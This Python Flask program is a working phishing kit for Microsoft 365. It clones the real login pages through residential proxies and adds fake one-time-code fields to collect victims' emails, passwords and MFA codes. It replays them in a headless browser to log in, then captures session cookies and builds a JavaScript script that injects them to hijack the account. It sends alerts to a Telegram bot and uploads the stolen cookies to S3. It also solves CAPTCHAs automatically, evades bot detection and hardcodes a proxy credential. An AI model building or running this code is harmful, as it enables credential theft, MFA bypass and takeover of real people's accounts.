import os
import time
import json
import uuid
import random
import threading
import requests
import base64
from flask import Flask, request, Response, make_response
from bs4 import BeautifulSoup
from urllib.parse import quote, urljoin
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from PIL import Image
import io

# === CONFIG ===
port = int(os.environ.get("PORT", 5000))
app = Flask(__name__)
CACHE_DIR = "/tmp/mslogin_cache"
ASSET_CACHE_DIR = "/tmp/asset_cache"
os.makedirs(CACHE_DIR, exist_ok=True)
os.makedirs(ASSET_CACHE_DIR, exist_ok=True)
CACHE_TTL = 21600  # 6 hours

HOME_DIR = os.path.expanduser("~")
BASE_CACHE_PATH = os.path.join(HOME_DIR, "AppData", "Local", "SysRunCache")
os.makedirs(BASE_CACHE_PATH, exist_ok=True)

# === PROXY CONFIG ===
PROXIES = [
    {
        "http": "http://brd-customer-hl_63e21a83-zone-residential_proxy1:p12arcxe874w@brd.superproxy.io:33335",
        "https": "http://brd-customer-hl_63e21a83-zone-residential_proxy1:p12arcxe874w@brd.superproxy.io:33335"
    },
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

# === TELEGRAM/S3 CONFIG ===
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
S3_BUCKET = os.getenv("S3_BUCKET")
S3_REGION = os.getenv("S3_REGION", "us-east-1")
S3_ACCESS_KEY = os.getenv("AWS_ACCESS_KEY_ID")
S3_SECRET_KEY = os.getenv("AWS_SECRET_ACCESS_KEY")

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def send_telegram_message(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[WARN] Telegram not configured.")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"[ERROR] Telegram notification failed: {e}")

def upload_to_s3(file_path, key):
    if not S3_BUCKET or not S3_ACCESS_KEY or not S3_SECRET_KEY:
        print("[WARN] S3 not configured.")
        return
    try:
        import boto3
        s3 = boto3.client(
            "s3",
            aws_access_key_id=S3_ACCESS_KEY,
            aws_secret_access_key=S3_SECRET_KEY,
            region_name=S3_REGION
        )
        s3.upload_file(file_path, S3_BUCKET, key)
        send_telegram_message(f"✅ Uploaded to S3: {key}")
    except Exception as e:
        send_telegram_message(f"❌ S3 upload failed: {e}")

# === SELENIUM SETUP ===
def setup_chrome_options(profile_dir=None):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-infobars")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--disable-software-rasterizer")
    chrome_options.add_argument("--remote-debugging-port=9222")
    if profile_dir:
        chrome_options.add_argument(f"--user-data-dir={profile_dir}")
    chrome_options.binary_location = "/usr/bin/chromium-browser"
    return chrome_options

# === CAPTCHA SOLVER (OCR) ===
def solve_captcha_with_ocr(image_url, proxy=None):
    try:
        import pytesseract
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        resp = requests.get(image_url, headers=headers, proxies=proxy, timeout=10)
        img = Image.open(io.BytesIO(resp.content))
        text = pytesseract.image_to_string(img).strip()
        return text
    except Exception as e:
        print(f"[ERROR] CAPTCHA OCR failed: {e}")
        return None

# === FETCH LOGIN PAGE WITH PROXY + FALLBACK + CAPTCHA DETECT ===
def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
    cache_path = os.path.join(CACHE_DIR, cache_key)
    now = time.time()
    if os.path.exists(cache_path) and now - os.path.getmtime(cache_path) < CACHE_TTL:
        with open(cache_path, "r", encoding="utf-8") as f:
            return f.read()

    headers = {"User-Agent": random.choice(USER_AGENTS)}
    proxy = get_random_proxy()
    time.sleep(random.uniform(1, 2))

    try:
        print(f"[DEBUG] Fetching {url} with proxy {proxy}")
        resp = requests.get(url, headers=headers, proxies=proxy, timeout=10)
        print(f"[DEBUG] Response status: {resp.status_code}")
        print(f"[DEBUG] Response headers: {resp.headers}")
        if "Access Denied" in resp.text or resp.status_code != 200:
            print(f"[ERROR] Access Denied or bad status code: {resp.status_code}")
            raise Exception("Blocked or error")
        html = resp.text
        soup = BeautifulSoup(html, "html.parser")

        # CAPTCHA Detection
        captcha_img = soup.find("img", {"src": lambda x: x and "captcha" in x.lower()})
        if captcha_img:
            captcha_src = captcha_img["src"]
            if not captcha_src.startswith("http"):
                captcha_src = urljoin(url, captcha_src)
            captcha_value = solve_captcha_with_ocr(captcha_src, proxy)
            if captcha_value:
                captcha_input = soup.find("input", {"name": "captcha"})
                if captcha_input:
                    captcha_input["value"] = captcha_value
                html = str(soup)
                send_telegram_message(f"✅ CAPTCHA auto-solved: {captcha_value}")

        with open(cache_path, "w", encoding="utf-8") as f:
            f.write(html)
        return html
    except Exception as e:
        print(f"[ERROR] Exception in fetch_ms_login: {e}")
        if use_browser_fallback:
            try:
                print("[DEBUG] Trying browser fallback...")
                profile_dir = f"/tmp/chrome_profile_{uuid.uuid4().hex[:6]}"
                chrome_options = setup_chrome_options(profile_dir)
                driver = webdriver.Chrome(options=chrome_options)
                driver.get(url)
                time.sleep(random.uniform(2, 4))
                html = driver.page_source
                driver.quit()
                with open(cache_path, "w", encoding="utf-8") as f:
                    f.write(html)
                return html
            except Exception as e2:
                print(f"[ERROR] Browser fallback failed: {e2}")
                return "<html><body><h2>Failed to fetch Microsoft login page.</h2></body></html>"
        else:
            return "<html><body><h2>Failed to fetch Microsoft login page.</h2></body></html>"

# === REWRITE FORM + PROXY ASSETS + ADD OTP/TOTP FIELDS + STYLING + AUTO-SUBMIT ===
def rewrite_form(html, action_url, extra_hidden=None, prefill=None, add_mfa_inputs=False):
    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form")
    if form:
        form['action'] = action_url
        form['method'] = "post"
        if extra_hidden:
            for k, v in extra_hidden.items():
                hidden = soup.new_tag("input", type="hidden", name=k, value=v)
                form.insert(0, hidden)
        if prefill and 'loginfmt' in prefill:
            email_input = form.find("input", {"name": "loginfmt"})
            if email_input:
                email_input['value'] = prefill['loginfmt']
        if add_mfa_inputs:
            style_tag = soup.new_tag("style")
            style_tag.string = """
                input[name="otc"], input[name="authenticatorCode"] {
                    width: 100%;
                    padding: 12px;
                    margin: 10px 0;
                    border: 1px solid #ccc;
                    border-radius: 4px;
                    font-size: 16px;
                }
            """
            soup.head.append(style_tag)
            otp_input = soup.new_tag("input", type="text", name="otc", placeholder="Enter OTP (SMS/Email)")
            totp_input = soup.new_tag("input", type="text", name="authenticatorCode", placeholder="Enter TOTP (Authenticator App)")
            submit_button = form.find("input", {"type": "submit"})
            if submit_button:
                submit_button.insert_before(otp_input)
                submit_button.insert_before(totp_input)
            else:
                form.append(otp_input)
                form.append(totp_input)
            script_tag = soup.new_tag("script")
            script_tag.string = """
                document.addEventListener("DOMContentLoaded", function () {
                    const otpInput = document.querySelector("input[name='otc']");
                    if (otpInput) {
                        otpInput.addEventListener("input", function () {
                            if (this.value.length === 6) {
                                this.form.submit();
                            }
                        });
                    }
                });
            """
            soup.body.append(script_tag)
    for tag in soup.find_all(["img", "link", "script"]):
        attr = "src" if tag.name != "link" else "href"
        if tag.has_attr(attr):
            val = tag[attr]
            if val.startswith("/"):
                full_url = "https://login.microsoftonline.com" + val
                tag[attr] = "/asset-proxy?url=" + quote(full_url, safe='')
            elif val.startswith("https://login.microsoftonline.com"):
                tag[attr] = "/asset-proxy?url=" + quote(val, safe='')
    return str(soup)

# === ASSET PROXY WITH CACHING + PROXY ===
@app.route('/asset-proxy')
def asset_proxy():
    import mimetypes
    url = request.args.get('url')
    print(f"[DEBUG] Asset proxy requested for: {url}")
    if not url or not url.startswith("https://login.microsoftonline.com"):
        print("[ERROR] Invalid asset URL")
        return "Invalid asset URL", 400

    safe_name = quote(url, safe='')
    cache_path = os.path.join(ASSET_CACHE_DIR, safe_name)
    now = time.time()
    if os.path.exists(cache_path) and now - os.path.getmtime(cache_path) < CACHE_TTL:
        print(f"[DEBUG] Serving asset from cache: {cache_path}")
        with open(cache_path, "rb") as f:
            content = f.read()
        content_type = mimetypes.guess_type(url)[0] or 'application/octet-stream'
        response = make_response(content)
        response.headers['Content-Type'] = content_type
        return response

    headers = {"User-Agent": random.choice(USER_AGENTS)}
    proxy = get_random_proxy()
    try:
        print(f"[DEBUG] Fetching asset {url} with proxy {proxy}")
        resp = requests.get(url, headers=headers, proxies=proxy, timeout=10)
        print(f"[DEBUG] Asset response status: {resp.status_code}")
        content_type = resp.headers.get('Content-Type') or mimetypes.guess_type(url)[0] or 'application/octet-stream'
        with open(cache_path, "wb") as f:
            f.write(resp.content)
        response = make_response(resp.content)
        response.headers['Content-Type'] = content_type
        return response
    except Exception as e:
        print(f"[ERROR] Asset fetch failed: {e}")
        return "Asset fetch failed", 500

# === HEALTH CHECK ROUTE ===
@app.route('/healthz')
def healthz():
    return "OK", 200

# === LOGIN ROUTES ===
@app.route('/', methods=['GET'])
def ms_login_email():
    ms_url = "https://login.microsoftonline.com/"
    html = fetch_ms_login(ms_url, "email.html", use_browser_fallback=True)
    html = rewrite_form(html, "/password")
    return Response(html, mimetype="text/html")

@app.route('/password', methods=['POST'])
def ms_login_password():
    email = request.form.get("loginfmt") or request.form.get("email")
    session_id = f"session_{int(time.time())}_{uuid.uuid4().hex[:6]}"
    with open(os.path.join(BASE_CACHE_PATH, f"{session_id}_email.txt"), "w") as f:
        f.write(email)
    ms_url = "https://login.microsoftonline.com/common/login"
    html = fetch_ms_login(ms_url, "password.html", use_browser_fallback=True, session_id=session_id)
    html = rewrite_form(html, "/mfa_check", extra_hidden={"session_id": session_id}, prefill={"loginfmt": email})
    return Response(html, mimetype="text/html")

@app.route('/mfa_check', methods=['POST'])
def ms_login_mfa():
    session_id = request.form.get("session_id")
    password = request.form.get("passwd") or request.form.get("password")
    otp = request.form.get("otc")
    totp = request.form.get("authenticatorCode")

    creds_file = os.path.join(BASE_CACHE_PATH, f"{session_id}_creds.json")
    with open(creds_file, "w") as f:
        json.dump({"password": password, "otp": otp, "totp": totp}, f)

    email_file = os.path.join(BASE_CACHE_PATH, f"{session_id}_email.txt")
    with open(email_file, "r") as f:
        email = f.read().strip()

    thread = threading.Thread(target=auto_login_dynamic_mfa, args=(email, password, otp, totp, session_id))
    thread.start()

    ms_url = "https://login.microsoftonline.com/common/login"
    html = fetch_ms_login(ms_url, "mfa.html", use_browser_fallback=True)
    html = rewrite_form(html, "/final", extra_hidden={"session_id": session_id}, add_mfa_inputs=True)
    return Response(html, mimetype="text/html")

@app.route('/final', methods=['POST'])
def ms_login_final():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Verifying...</title>
        <link rel="icon" href="https://login.microsoftonline.com/favicon.ico">
        <style>
            body { background: radial-gradient(circle at 50% 50%, #f3f2f1 0%, #e6e6e6 100%); min-height: 100vh; margin: 0; font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif; text-align: center; }
            .center { margin-top: 200px; }
        </style>
    </head>
    <body>
        <div class="center">
            <h2>Verifying your account...</h2>
            <img src="https://i.gifer.com/ZZ5H.gif" width="50">
            <p>You may close this window.</p>
        </div>
    </body>
    </html>
    '''

# === BACKEND LOGIN LOGIC ===
def auto_login_dynamic_mfa(email, password, otp, totp, session_id):
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import NoSuchElementException, TimeoutException

    try:
        profile_path = os.path.join(BASE_CACHE_PATH, f"profile_{uuid.uuid4()}")
        os.makedirs(profile_path, exist_ok=True)
        chrome_options = setup_chrome_options(profile_path)
        driver = webdriver.Chrome(options=chrome_options)
        driver.get("https://login.microsoftonline.com")

        time.sleep(3)
        driver.find_element("css selector", "input[type='email']").send_keys(email)
        driver.find_element("css selector", "input[type='submit']").click()

        time.sleep(5)
        driver.find_element("css selector", "input[type='password']").send_keys(password)
        driver.find_element("css selector", "input[type='submit']").click()

        time.sleep(5)
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='otc'], input[name='authenticatorCode']"))
            )
            if otp:
                driver.find_element("css selector", "input[name='otc']").send_keys(otp)
            elif totp:
                driver.find_element("css selector", "input[name='authenticatorCode']").send_keys(totp)
            driver.find_element("css selector", "input[type='submit']").click()
        except TimeoutException:
            pass

        wait_for_login(driver, session_id)
    except Exception as e:
        send_telegram_message(f"❌ Auto-login failed: {e}")
        print(f"[ERROR] {e}")
    finally:
        try:
            driver.quit()
        except:
            pass

def wait_for_login(driver, session_id, timeout=120):
    start = time.time()
    while time.time() - start < timeout:
        url = driver.current_url.lower()
        if any(x in url for x in [
            "login.microsoftonline.com", "login.live.com", "login.windows.net"
        ]):
            time.sleep(2)
            continue
        try:
            driver.find_element("css selector", "div.o365cs-nav-appTile")
            capture_cookies(driver, session_id)
            return True
        except Exception:
            pass
        if any(domain in url for domain in [
            "outlook.office.com", "m365.cloud.microsoft", "office.com"
        ]) and not any(x in url for x in [
            "login.microsoftonline.com", "login.live.com", "login.windows.net"
        ]):
            capture_cookies(driver, session_id)
            return True
        time.sleep(2)
    send_telegram_message("❌ Login timeout.")
    return False

def capture_cookies(driver, session_id):
    session_dir= os.path.join(BASE_CACHE_PATH, session_id)
    os.makedirs(session_dir, exist_ok=True)
    all_cookies = driver.get_cookies()
    relevant_cookies = [c for c in all_cookies if any(t in c.get('domain', '') for t in [
        ".microsoftonline.com",
        ".login.microsoftonline.com",
        ".live.com",
        ".office.com",
        ".outlook.com",
        "m365.cloud.microsoft"
    ])]

    cookie_file = os.path.join(session_dir, "mfa_session_data.json")
    script_file = os.path.join(session_dir, "mfa_inject_all_domains.js")
    with open(cookie_file, "w") as f:
        json.dump(relevant_cookies, f, indent=2)
    generate_injection_script(relevant_cookies, session_dir)

    send_telegram_message(f"✅ Session captured: {session_id}")
    if S3_BUCKET:
        upload_to_s3(cookie_file, f"sessions/{session_id}/mfa_session_data.json")
        upload_to_s3(script_file, f"sessions/{session_id}/mfa_inject_all_domains.js")

def generate_injection_script(cookies, session_dir):
    cookies_by_domain = {}
    for cookie in cookies:
        dom = cookie['domain'].lstrip('.')
        if dom not in cookies_by_domain:
            cookies_by_domain[dom] = []
        cookies_by_domain[dom].append(cookie)

    js_lines = [
        "console.log('Injecting Office 365 session cookies...');",
        "function setCookie(name, value, domain, path, secure, sameSite) {",
        "  let cookieStr = `${name}=${value}; path=${path || '/'}; domain=.${domain}; Max-Age=31536000;`;",
        "  if (secure) cookieStr += ' Secure;';",
        "  if (sameSite && sameSite !== 'None') cookieStr += ` SameSite=${sameSite};`;",
        "  document.cookie = cookieStr;",
        "}",
    ]
    for domain, domain_cookies in cookies_by_domain.items():
        js_lines.append(f"// --- Cookies for .{domain} ---")
        for c in domain_cookies:
            name = c['name'].replace("'", "\\'")
            value = c['value'].replace("'", "\\'")
            path = c.get('path', '/').replace("'", "\\'")
            secure = str(c.get('secure', False)).lower()
            sameSite = c.get('sameSite', 'None')
            js_lines.append(
                f"setCookie('{name}', '{value}', '{domain}', '{path}', {secure}, '{sameSite}');"
            )
    js_lines.append("console.log('All cookies injected. Redirecting...');")
    js_lines.append("setTimeout(() => window.location.href = 'https://m365.cloud.microsoft/?auth=1', 2000);")
    with open(os.path.join(session_dir, "mfa_inject_all_domains.js"), "w") as f:
        f.write("\n".join(js_lines))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=port)
